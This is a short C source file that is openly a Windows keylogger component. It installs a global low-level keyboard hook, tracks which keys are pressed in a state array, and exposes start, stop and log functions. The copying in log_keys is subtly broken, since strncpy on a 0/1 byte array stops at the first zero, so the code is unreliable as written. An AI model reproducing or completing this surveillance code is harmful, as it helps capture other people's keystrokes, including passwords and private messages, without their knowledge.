#include <Windows.h>
#include <stdio.h>

HHOOK hHook = NULL;

char keylog[256] = { 0 };

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
		if (wParam == WM_KEYDOWN) {
			keylog[p->vkCode] = 1;
		}
		else if (wParam == WM_KEYUP) {
			keylog[p->vkCode] = 0;
		}
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void keylogger_init() {
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	if(hHook == NULL) {
		printf("Failed to set hook\n");
	}
}

void keylogger_start() {
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void keylogger_stop() {
	UnhookWindowsHookEx(hHook);
}

void log_keys(char* buffer, int size) {
	strncpy(buffer, keylog, size);
	buffer[size - 1] = '\0';
}

